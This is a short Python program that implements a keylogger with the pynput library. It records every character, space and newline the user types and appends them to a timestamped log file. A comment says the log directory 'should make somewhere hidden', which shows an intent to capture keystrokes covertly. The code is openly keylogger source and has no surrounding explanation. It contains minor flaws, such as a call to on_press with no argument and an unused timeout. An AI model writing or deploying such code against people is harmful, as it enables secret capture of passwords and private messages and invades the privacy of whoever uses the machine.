from pynput.keyboard import Key, Listener
import logging
from datetime import datetime

class MyKeyLogger:
    _timeout = 10
    _events = []
    _log_dir = "" # Should make somewhere hidden
    _log_filename = datetime.strftime(datetime.now(),"%Y%m%d_%H:%M.log")
    _log_file_fullpath = ""
    
    def __init__(self):
        self._log_file_fullpath = self._log_dir + self._log_filename
            
    def reset_timeout(self):
        self._timeout = 10
    
    def on_press(self, key):
        try:
            self._events.append(str(key.char))
        except AttributeError:
            if key == Key.space:
                self._events.append(" ")
            elif key == Key.enter:
                self._events.append("\n")
            elif key == Key.shift or key == Key.backspace or key == Key.ctrl or key == Key.cmd:
                # Do nothing for logging here but also don't throw a message.
                pass
            else:
                print("%s : not logged" % key.name)
            
        self.write_to_file()
    
    def write_to_file(self):
        with open(self._log_file_fullpath, 'a+') as f:
            f.write("".join(self._events))
            del self._events[:]

    def do_listening(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()
        self.on_press()

def __main__():
    my_key_logger = MyKeyLogger()
    my_key_logger.do_listening()

if __name__ == "__main__":
    __main__()
